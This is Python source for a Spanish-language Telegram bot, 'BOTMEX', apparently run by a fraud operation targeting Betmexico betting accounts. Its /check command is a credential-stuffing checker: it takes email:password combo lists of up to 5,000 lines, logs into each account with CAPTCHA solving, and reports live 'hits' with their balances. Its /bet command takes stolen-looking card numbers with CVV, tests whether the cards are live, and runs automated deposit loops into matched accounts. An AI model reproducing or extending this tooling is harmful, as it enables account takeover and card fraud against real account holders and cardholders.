"""Telegram Bot Mock — Versión simplificada y desacoplada del bot de Telegram.
Implementa únicamente los comandos requeridos: /start, /help, /cancel, /botmex, /check y /bet.
Usa la misma BD compartida y los motores de login / matchmaking del dashboard.
"""

import asyncio
import os
import sys
import time
from pathlib import Path
from typing import List, Dict, Any, Tuple

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler,
)

# Permitir imports directos desde el directorio del bot
_MOCK_DIR = Path(__file__).parent.resolve()
if str(_MOCK_DIR) not in sys.path:
    sys.path.insert(0, str(_MOCK_DIR))

try:
    from telegram_bot_mock.config import (
        logger,
        MOCK_BOT_TOKEN,
        DASHBOARD_URL,
        SUPERADMIN_ID,
        is_authorized,
        DB_PATH,
        HEADER_LOCKUP,
    )
except ImportError:
    from config import (
        logger,
        MOCK_BOT_TOKEN,
        DASHBOARD_URL,
        SUPERADMIN_ID,
        is_authorized,
        DB_PATH,
        HEADER_LOCKUP,
    )

# Imports del dashboard & bot core
from app import filter_and_sanitize_check_combos, db, _persist_auto_mission
from login_orchestrator import gentle_login
from prewarm import _db_upsert_balance, _db_save_txns_and_recalc, _db_mark_dead, _fetch_looks_empty
from card_checker import precheck_card_liveness, format_ruthopia_liveness_summary
from auto_deposit import plan_auto_mission, run_auto_mission
from deposits import _mission_sem

# Estados de Conversación
(WAIT_CHECK_CONFIRM, WAIT_BET_CONFIRM) = range(2)


# Eventos de confirmación en espera para /bet confirm_gate
_confirm_events: Dict[str, Tuple[asyncio.Event, Dict[str, Any]]] = {}


# ─────────────────────────────────────────────────────────────────────
# COMANDOS BÁSICOS (Estilo Minimalista Limbo)
# ─────────────────────────────────────────────────────────────────────

HEADER = "👁️ <b>BOTMEX</b>"

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start — Entrada directa minimalista."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text(f"{HEADER}\n\nAcceso denegado.", parse_mode="HTML")
        return

    msg = (
        f"{HEADER}\n\n"
        "Sistema en línea.\n"
        "Sin intermediarios.\n\n"
        "<b>Comandos:</b>\n"
        "• /bet — Depósito automático\n"
        "• /check — Verificar combos\n"
        "• /botmex — Portal Web\n"
        "• /help — Guía rápida\n"
        "• /cancel — Abortar todo"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ Iniciar Depósito (/bet)", callback_data="btn_start_bet")],
        [InlineKeyboardButton("🔍 Verificar Combos (/check)", callback_data="btn_start_check")],
        [InlineKeyboardButton("🌐 Portal Web", url=DASHBOARD_URL)]
    ])
    await update.message.reply_text(msg, parse_mode="HTML", reply_markup=kb)


async def start_buttons_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback para botones rápidos del /start."""
    query = update.callback_query
    await query.answer()
    if query.data == "btn_start_bet":
        await query.edit_message_text(
            f"{HEADER}\n\n"
            "🎰 <b>MODO DEPÓSITO (/bet)</b>\n\n"
            "Envía 1 a 4 tarjetas pipe:\n"
            "<code>4111111111111111|12|28|123</code>",
            parse_mode="HTML"
        )
        return WAIT_BET_CONFIRM
    elif query.data == "btn_start_check":
        await query.edit_message_text(
            f"{HEADER}\n\n"
            "📥 <b>VERIFICACIÓN COMBOS (/check)</b>\n\n"
            "Envía combos en chat (máx 100) o archivo .txt (máx 5,000):\n"
            "<code>correo:contraseña</code>",
            parse_mode="HTML"
        )
        return WAIT_CHECK_CONFIRM


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /help — Tajante de pocas palabras."""
    msg = (
        f"{HEADER}\n\n"
        "<b>Manual Operativo:</b>\n\n"
        "1. <b>/bet</b>\n"
        "Ingresa 1 a 4 tarjetas pipe.\n"
        "Matchmaking y depósito automático.\n\n"
        "2. <b>/check</b>\n"
        "Combos <code>correo:pass</code>.\n"
        "Valida liveness sin tocar saldo.\n\n"
        "3. <b>/cancel</b>\n"
        "Detiene cualquier proceso activo.\n\n"
        "4. <b>/botmex</b>\n"
        "Acceso directo al portal web."
    )
    await update.message.reply_text(msg, parse_mode="HTML")


async def botmex_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /botmex."""
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Entrar al Portal", url=DASHBOARD_URL)]
    ])
    await update.message.reply_text(
        f"{HEADER}\n\n"
        f"Acceso al núcleo:\n{DASHBOARD_URL}",
        parse_mode="HTML",
        reply_markup=kb,
    )


async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /cancel — Aborta misiones y limpia estado de conversación."""
    user_id = update.effective_user.id

    with db(write=True) as c:
        c.execute(
            "UPDATE auto_missions SET status='cancelled' "
            "WHERE operator_id=? AND status IN ('pending', 'running', 'paused')",
            (user_id,)
        )

    context.user_data.clear()
    await update.message.reply_text(
        f"{HEADER}\n\n"
        "🛑 Proceso abortado.\n"
        "Operaciones detenidas.",
        parse_mode="HTML"
    )
    return ConversationHandler.END


# ─────────────────────────────────────────────────────────────────────
# FLUJO /CHECK
# ─────────────────────────────────────────────────────────────────────

async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Punto de entrada para /check — Recibe texto o archivo .txt."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ No autorizado.")
        return ConversationHandler.END

    await update.message.reply_text(
        "📥 <b>ENVÍA LOS COMBOS A VERIFICAR</b>\n\n"
        "• Pegados en chat: Máximo 100 líneas.\n"
        "• Archivo .txt: Adjunta el documento (máximo 5,000 líneas).\n\n"
        "<i>Formato: correo:contraseña (opcional :tarjeta|mm|yy|cvv)</i>",
        parse_mode="HTML"
    )
    return WAIT_CHECK_CONFIRM


async def process_check_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Procesa el texto o documento enviado para /check."""
    user_id = update.effective_user.id
    combos = []

    if update.message.document:
        doc = update.message.document
        if not doc.file_name.endswith(".txt"):
            await update.message.reply_text("❌ Solo se admiten archivos con extensión .txt")
            return WAIT_CHECK_CONFIRM

        file_obj = await context.bot.get_file(doc.file_id)
        content_bytes = await file_obj.download_as_bytearray()
        try:
            text_content = content_bytes.decode("utf-8", errors="ignore")
        except Exception:
            text_content = content_bytes.decode("latin-1", errors="ignore")

        combos = [line.strip() for line in text_content.splitlines() if line.strip()]
        if len(combos) > 5000:
            await update.message.reply_text("❌ El archivo supera el límite de 5,000 líneas.")
            return WAIT_CHECK_CONFIRM

    elif update.message.text:
        text = update.message.text.strip()
        if text.startswith("/"):
            await update.message.reply_text("❌ Envía la lista de combos, no un comando.")
            return WAIT_CHECK_CONFIRM
        combos = [line.strip() for line in text.splitlines() if line.strip()]
        if len(combos) > 100:
            await update.message.reply_text("❌ Máximo 100 combos en chat. Para más, adjunta un archivo .txt (hasta 5,000).")
            return WAIT_CHECK_CONFIRM

    if not combos:
        await update.message.reply_text("❌ No se encontraron combos en la entrada.")
        return WAIT_CHECK_CONFIRM

    filtered = filter_and_sanitize_check_combos(combos)
    valid_list = filtered["valid_combos"]

    if not valid_list:
        summary_msg = (
            f"<b>❌ NINGÚN COMBO SUPERÓ LAS VALIDACIONES</b>\n\n"
            f"• <b>Recibidos:</b> {filtered['total_received']}\n"
            f"• <b>Duplicados:</b> {filtered['dupes_count']}\n"
            f"• <b>Ya existen en BD (Correo):</b> {len(filtered['in_db_emails'])}\n"
            f"• <b>Ya existen en BD (Tarjeta):</b> {len(filtered['in_db_cards'])}\n"
            f"• <b>Tarjetas Inválidas / Luhn:</b> {len(filtered['invalid_cards'])}\n\n"
            f"💡 <i>Las cuentas omitidas se pueden consultar en {DASHBOARD_URL}</i>"
        )
        await update.message.reply_text(summary_msg, parse_mode="HTML")
        return ConversationHandler.END

    # Guardar en context para la confirmación
    context.user_data["pending_check"] = valid_list
    context.user_data["filtered_summary"] = filtered

    confirm_msg = (
        f"<b>⚠️ CONFIRMACIÓN DE CHECK SOLICITADA</b>\n\n"
        f"• <b>Total Recibidos:</b> {filtered['total_received']}\n"
        f"• <b>Duplicados Omitidos:</b> {filtered['dupes_count']}\n"
        f"• <b>Ya en BD (Omitidos):</b> {len(filtered['in_db_emails']) + len(filtered['in_db_cards'])}\n"
        f"• <b>Tarjetas Inválidas:</b> {len(filtered['invalid_cards'])}\n"
        f"• <b>Nuevos a Verificar:</b> <b>{len(valid_list)}</b>\n\n"
        f"<i>¿Deseas iniciar la verificación?</i>"
    )
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Iniciar Check", callback_data="confirm_check"),
            InlineKeyboardButton("❌ Cancelar", callback_data="cancel_check")
        ]
    ])
    await update.message.reply_text(confirm_msg, parse_mode="HTML", reply_markup=kb)
    return WAIT_CHECK_CONFIRM


async def handle_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja los botones de confirmación de /check."""
    query = update.callback_query
    await query.answer()

    if query.data == "cancel_check":
        context.user_data.pop("pending_check", None)
        await query.edit_message_text("❌ Verificación /check cancelada.")
        return ConversationHandler.END

    if query.data == "confirm_check":
        valid_combos = context.user_data.get("pending_check", [])
        if not valid_combos:
            await query.edit_message_text("❌ No hay combos pendientes.")
            return ConversationHandler.END

        await query.edit_message_text(f"🚀 <b>Iniciando /check para {len(valid_combos)} combo(s)...</b>", parse_mode="HTML")

        # Ejecución asíncrona de verificación
        asyncio.create_task(_run_check_task(query.message.chat_id, context.bot, valid_combos, update.effective_user.id))
        return ConversationHandler.END


async def _run_check_task(chat_id: int, bot, valid_combos: List[Dict[str, Any]], operator_id: int):
    """Ejecuta el ciclo de gentle_login + balance check para cada combo válido."""
    cap_key = os.environ.get("CAPMONSTER_KEY", "") or os.environ.get("BMX_CAPMONSTER_KEY", "")

    from betmexico_login_service import make_pool
    pool = make_pool(cap_key, size=2, workers=1) if cap_key else None

    hits_count = 0
    dead_count = 0
    errors_count = 0
    total = len(valid_combos)

    status_msg = await bot.send_message(
        chat_id=chat_id,
        text=f"⏳ <b>Progreso Check:</b> 0/{total} procesados...",
        parse_mode="HTML"
    )

    try:
        from betmexico_login_api import BetmexicoApiChecker
        for idx, item in enumerate(valid_combos, 1):
            email = item["email"]
            password = item["password"]
            card_pipe = item.get("card_pipe", "")

            login_res = await gentle_login(
                email,
                password,
                max_login_retries=3,
                throttle=True,
                pool=pool,
                use_cache=True
            )

            if login_res.ok and login_res.jwt:
                jwt = login_res.jwt
                async with BetmexicoApiChecker() as checker:
                    try:
                        details = await asyncio.wait_for(
                            checker.fetch_account_details_parallel(jwt, fetch_mode="balance_only"),
                            timeout=15.0
                        )
                    except Exception:
                        details = None

                if details and not _fetch_looks_empty(details):
                    _db_upsert_balance(email, details)
                    _db_save_txns_and_recalc(email, details, operator_id)
                    bal_real = float(details.get("balance_real", 0.0) or 0.0)
                    bal_bonos = float(details.get("balance_bonos", 0.0) or 0.0)
                    total_bal = bal_real + bal_bonos

                    hits_count += 1
                    # NOTA DE SEGURIDAD: La contraseña JAMÁS se incluye.
                    # Para el operador que ingresó el combo, la tarjeta (si venía) se muestra completa para su control.
                    card_info_str = f"\n• <b>Tarjeta:</b> <code>{card_pipe}</code>" if card_pipe else ""
                    hit_text = (
                        f"🎯 <b>HIT DETECTADO</b>\n"
                        f"• <b>Correo:</b> <code>{email}</code>{card_info_str}\n"
                        f"• <b>Saldo Real:</b> ${bal_real:.2f} MXN\n"
                        f"• <b>Saldo Bonos:</b> ${bal_bonos:.2f} MXN\n"
                        f"• <b>Total:</b> <b>${total_bal:.2f} MXN</b>\n"
                        f"🌐 <i>Gestionar en {DASHBOARD_URL}</i>"
                    )
                    await bot.send_message(chat_id=chat_id, text=hit_text, parse_mode="HTML")
                else:
                    hits_count += 1
            elif login_res.account_dead:
                dead_count += 1
                _db_mark_dead(email, login_res.error or "LOGIN_DENIED")
            else:
                errors_count += 1

            if idx % 5 == 0 or idx == total:
                try:
                    await status_msg.edit_text(
                        f"⏳ <b>Progreso Check:</b> {idx}/{total}\n"
                        f"• Hits/LIVE: {hits_count}\n"
                        f"• DEAD: {dead_count}\n"
                        f"• Errores/Retry: {errors_count}",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

    finally:
        if pool:
            await pool.stop()

    summary_final = (
        f"✅ <b>CHECK FINALIZADO</b>\n\n"
        f"• <b>Total Verificados:</b> {total}\n"
        f"• <b>Hits / Cuentas LIVE:</b> {hits_count}\n"
        f"• <b>Cuentas DEAD:</b> {dead_count}\n"
        f"• <b>Errores / Reintentos:</b> {errors_count}\n\n"
        f"🌐 <i>Consulta tus cuentas en {DASHBOARD_URL}</i>"
    )
    await bot.send_message(chat_id=chat_id, text=summary_final, parse_mode="HTML")


# ─────────────────────────────────────────────────────────────────────
# FLUJO /BET
# ─────────────────────────────────────────────────────────────────────

async def bet_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Punto de entrada para /bet — Solicita tarjetas."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ No autorizado.")
        return ConversationHandler.END

    await update.message.reply_text(
        "🎰 <b>MODO AUTOMÁTICO DE DEPÓSITO (/BET)</b>\n\n"
        "Envía de 1 a 4 tarjetas en formato pipe:\n"
        "<code>4111111111111111|12|28|123</code>\n\n"
        "<i>Una por línea (máximo 4 tarjetas por intento).</i>",
        parse_mode="HTML"
    )
    return WAIT_BET_CONFIRM


async def process_bet_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Procesa las tarjetas ingresadas para /bet."""
    text = update.message.text.strip() if update.message.text else ""
    if text.startswith("/"):
        await update.message.reply_text("❌ Envía las tarjetas, no un comando.")
        return WAIT_BET_CONFIRM

    card_pipes = [line.strip() for line in text.splitlines() if line.strip()]
    if not card_pipes or len(card_pipes) > 4:
        await update.message.reply_text("❌ Debes enviar entre 1 y 4 tarjetas por intento.")
        return WAIT_BET_CONFIRM

    operator_id = update.effective_user.id
    MAX_DAILY_STRIKES = 5

    # Comprobar strikes
    with db(write=True) as c:
        row = c.execute(
            "SELECT strikes_count, penalty_until FROM operator_penalties WHERE telegram_id=?",
            (operator_id,)
        ).fetchone()
        strikes_count = (row["strikes_count"] or 0) if row else 0

    if strikes_count >= MAX_DAILY_STRIKES:
        await update.message.reply_text(
            f"❌ <b>Límite de {MAX_DAILY_STRIKES} strikes diarios alcanzado.</b> Contacta al SuperAdmin.",
            parse_mode="HTML"
        )
        return ConversationHandler.END

    # Validar liveness
    valid_pipes = []
    liveness_records = []
    for pipe in card_pipes:
        ok, reason, parsed = precheck_card_liveness(pipe)
        liveness_records.append({"pipe": pipe, "ok": ok, "status_label": reason})
        logger.info(
            f"[CARD_TOUCH] operator={operator_id} | account=N/A(precheck) | "
            f"pipe={pipe} | status={'live' if ok else 'dead'} | reason={reason}"
        )
        if ok:
            valid_pipes.append(parsed["pipe_3parts"])

    summary_text = format_ruthopia_liveness_summary(liveness_records)
    if not valid_pipes:
        await update.message.reply_text(
            f"❌ Ninguna tarjeta es válida:\n\n{summary_text}",
            parse_mode="HTML"
        )
        return ConversationHandler.END

    context.user_data["pending_bet_pipes"] = valid_pipes

    strikes_left = MAX_DAILY_STRIKES - strikes_count
    confirm_msg = (
        f"<b>⚠️ CONFIRMACIÓN DE DEPÓSITO AUTOMÁTICO</b>\n\n"
        f"• <b>Tarjetas Válidas:</b> {len(valid_pipes)}\n"
        f"• <b>Strikes Restantes:</b> {strikes_left} / {MAX_DAILY_STRIKES}\n\n"
        f"{summary_text}\n\n"
        f"<i>¿Deseas iniciar el proceso de matchmaking y depósito?</i>"
    )
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚀 Iniciar Depósitos", callback_data="confirm_bet"),
            InlineKeyboardButton("❌ Cancelar", callback_data="cancel_bet")
        ]
    ])
    await update.message.reply_text(confirm_msg, parse_mode="HTML", reply_markup=kb)
    return WAIT_BET_CONFIRM


async def handle_bet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja la confirmación de /bet."""
    query = update.callback_query
    await query.answer()

    if query.data == "cancel_bet":
        context.user_data.pop("pending_bet_pipes", None)
        await query.edit_message_text("❌ Proceso /bet cancelado.")
        return ConversationHandler.END

    if query.data == "confirm_bet":
        valid_pipes = context.user_data.get("pending_bet_pipes", [])
        if not valid_pipes:
            await query.edit_message_text("❌ No hay tarjetas guardadas.")
            return ConversationHandler.END

        if _mission_sem.locked():
            await query.edit_message_text("⚠️ Ya hay una misión de depósitos activa en el sistema. Intenta de nuevo en unos momentos.")
            return ConversationHandler.END

        operator_id = update.effective_user.id
        amount = 150.0
        target_count = 9

        plan = plan_auto_mission(DB_PATH, valid_pipes, amount, target_count)
        if not plan["feasible"]:
            await query.edit_message_text(f"❌ No fue posible armar el plan: {plan['reason']}")
            return ConversationHandler.END

        from uuid import uuid4
        mission_id = str(uuid4())[:8]
        user_info = {"telegram_id": operator_id, "username": update.effective_user.username or "operator"}

        _persist_auto_mission(mission_id, operator_id, valid_pipes, amount, target_count, plan)

        # Mensaje base inicial de la misión
        status_msg = await query.edit_message_text(
            f"{HEADER}\n\n"
            f"🎯 <b>MISIÓN {mission_id}</b>\n\n"
            f"• Estado: Rastreo activo...\n"
            f"• Link: {DASHBOARD_URL}/?match={mission_id}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Detener Misión", callback_data=f"stop_mission_{mission_id}")]])
        )

        last_edit_ts = [0.0]
        loop = asyncio.get_running_loop()

        def on_progress(status: str, extra: dict):
            now = time.time()
            # Mapear status -> Limbo style minimal text con animación/pasos
            step = extra.get('current', 1)
            total = extra.get('total', 1)
            pct = int((step / total) * 100) if total > 0 else 0

            if status == "matching":
                st_text = f"⏳ Evaluando cuentas ({extra.get('accounts', 0)} elegibles)..."
            elif status == "logging_in":
                email = extra.get('email', '')
                st_text = f"🔄 Acceso en curso [{step}/{total}] ({pct}%)\n  └ <code>{email}</code>"
            elif status == "match":
                email = extra.get('email', '')
                st_text = f"🎯 Target fijado [{step}/{total}]\n  └ <code>{email}</code>"
            elif status == "cooldown":
                email = extra.get('email', '')
                st_text = f"⏳ Pausa táctica [{step}/{total}]\n  └ <code>{email}</code>"
            elif status == "awaiting_confirmation":
                st_text = f"⚠️ Confirmación requerida ({extra.get('matches', 0)} parejas en standby)"
            elif status == "scheduling":
                comp = extra.get('completed', 0)
                tot = extra.get('total', 9)
                st_text = f"⚡ Ejecución en curso ({comp}/{tot} depósitos)"
            elif status in ("completed", "cancelled", "failed"):
                st_text = f"🏁 Finalizado ({status})"
            else:
                st_text = f"⏳ {status}"

            text = (
                f"{HEADER}\n\n"
                f"🎯 <b>MISIÓN {mission_id}</b>\n\n"
                f"• {st_text}\n\n"
                f"• Link: {DASHBOARD_URL}/?match={mission_id}"
            )

            # Incondicional para terminal o awaiting_confirmation, throttleado 2.5s para el resto
            is_priority = status in ("awaiting_confirmation", "completed", "cancelled", "failed")
            if not is_priority and (now - last_edit_ts[0] < 2.5):
                return
            last_edit_ts[0] = now

            async def _edit():
                try:
                    await status_msg.edit_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Detener Misión", callback_data=f"stop_mission_{mission_id}")]]))
                except Exception:
                    pass

            asyncio.run_coroutine_threadsafe(_edit(), loop)

        async def confirm_gate(gate_info: dict) -> bool:
            m_id = gate_info["mission_id"]
            matches = gate_info["matches"]
            amt = gate_info.get("amount", 150.0)
            target = gate_info.get("target_count", 9)

            ev = asyncio.Event()
            _confirm_events[m_id] = (ev, {"decision": False})

            match_lines = []
            for m in matches:
                em = m.get("email", "")
                c_stp = m.get("clabe_stp")
                if c_stp:
                    match_lines.append(f"• <code>{em}</code>\n  CLABE STP: <code>{c_stp}</code>")
                else:
                    match_lines.append(f"• <code>{em}</code>")

            match_text_block = "\n".join(match_lines)
            confirm_text = (
                f"{HEADER}\n\n"
                f"⚠️ <b>AUTORIZAR LOOP</b>\n\n"
                f"Misión: <code>{m_id}</code>\n"
                f"Match: {len(matches)} cuentas\n"
                f"{match_text_block}\n\n"
                f"Programa: {target} × ${amt:.0f} MXN (60s)\n\n"
                f"🌐 Enlace: {DASHBOARD_URL}/portal?match={m_id}\n\n"
                f"¿Proceder?"
            )
            kb_confirm = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton(f"✅ Exec ({target}×${amt:.0f}/60s)", callback_data=f"confirm_sched_{m_id}"),
                    InlineKeyboardButton("🛑 Terminar", callback_data=f"stop_sched_{m_id}")
                ]
            ])
            try:
                await status_msg.edit_text(confirm_text, parse_mode="HTML", reply_markup=kb_confirm)
            except Exception as ex:
                logger.warning(f"[Bot] No pude editar mensaje a confirm_gate: {ex}")

            try:
                await asyncio.wait_for(ev.wait(), timeout=600.0)
                res = _confirm_events.get(m_id, (None, {"decision": False}))[1].get("decision", False)
            except asyncio.TimeoutError:
                res = False
                try:
                    await status_msg.edit_text(
                        f"{HEADER}\n\nTiempo agotado. Misión {m_id} cerrada.",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass
            finally:
                _confirm_events.pop(m_id, None)

            return res

        asyncio.create_task(run_auto_mission(mission_id, plan, user_info, on_progress=on_progress, confirm_gate=confirm_gate))
        return ConversationHandler.END


async def handle_confirm_gate_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja las respuestas de confirmación explícita (confirm_sched / stop_sched)."""
    query = update.callback_query
    await query.answer()
    data = query.data or ""
    if data.startswith("confirm_sched_"):
        mission_id = data.replace("confirm_sched_", "").strip()
        item = _confirm_events.get(mission_id)
        if item:
            ev, state = item
            state["decision"] = True
            ev.set()
        await query.edit_message_text(
            f"✅ <b>Loop programado AUTORIZADO para misión {mission_id}.</b>\nIniciando depósitos...",
            parse_mode="HTML"
        )
    elif data.startswith("stop_sched_"):
        mission_id = data.replace("stop_sched_", "").strip()
        item = _confirm_events.get(mission_id)
        if item:
            ev, state = item
            state["decision"] = False
            ev.set()
        await query.edit_message_text(
            f"🛑 <b>Loop programado CANCELADO para misión {mission_id}.</b>\nMisión finalizada tras matchmaking.",
            parse_mode="HTML"
        )


async def handle_stop_mission_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja el botón '🛑 Detener Misión' enviado en el mensaje de éxito."""
    query = update.callback_query
    await query.answer()
    if query.data.startswith("stop_mission_"):
        mission_id = query.data.replace("stop_mission_", "").strip()
        user_id = update.effective_user.id
        with db(write=True) as c:
            c.execute(
                "UPDATE auto_missions SET status='cancelled' WHERE mission_id=?",
                (mission_id,)
            )
        await query.edit_message_text(
            f"🛑 <b>Misión {mission_id} detenida por el operador.</b>\nCuentas liberadas.",
            parse_mode="HTML"
        )


# ─────────────────────────────────────────────────────────────────────
# CONFIGURACIÓN Y MAIN
# ─────────────────────────────────────────────────────────────────────

def build_app():
    """Construye la aplicación python-telegram-bot."""
    app = ApplicationBuilder().token(MOCK_BOT_TOKEN).build()

    # Handlers directos
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("botmex", botmex_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))

    # Handler callback para botones de /start
    app.add_handler(CallbackQueryHandler(start_buttons_callback, pattern="^(btn_start_bet|btn_start_check)$"))

    # Handler callback independiente para detener misión iniciada
    app.add_handler(CallbackQueryHandler(handle_stop_mission_callback, pattern="^stop_mission_"))
    app.add_handler(CallbackQueryHandler(handle_confirm_gate_callback, pattern="^(confirm_sched_|stop_sched_)"))

    # ConversationHandler para /check
    check_handler = ConversationHandler(
        entry_points=[
            CommandHandler("check", check_cmd),
            CallbackQueryHandler(start_buttons_callback, pattern="^btn_start_check$"),
        ],
        states={
            WAIT_CHECK_CONFIRM: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_check_input),
                MessageHandler(filters.Document.ALL, process_check_input),
                CallbackQueryHandler(handle_check_callback, pattern="^(confirm_check|cancel_check)$"),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    app.add_handler(check_handler)

    # ConversationHandler para /bet
    bet_handler = ConversationHandler(
        entry_points=[
            CommandHandler("bet", bet_cmd),
            CallbackQueryHandler(start_buttons_callback, pattern="^btn_start_bet$"),
        ],
        states={
            WAIT_BET_CONFIRM: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_bet_input),
                CallbackQueryHandler(handle_bet_callback, pattern="^(confirm_bet|cancel_bet)$"),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    app.add_handler(bet_handler)

    return app


if __name__ == "__main__":
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    print(f"[BOT MOCK] Iniciando Telegram Bot Mock con Token: {MOCK_BOT_TOKEN[:10]}...")
    print(f"[BOT MOCK] Base de Datos configurada: {DB_PATH}")
    app = build_app()
    app.run_polling()
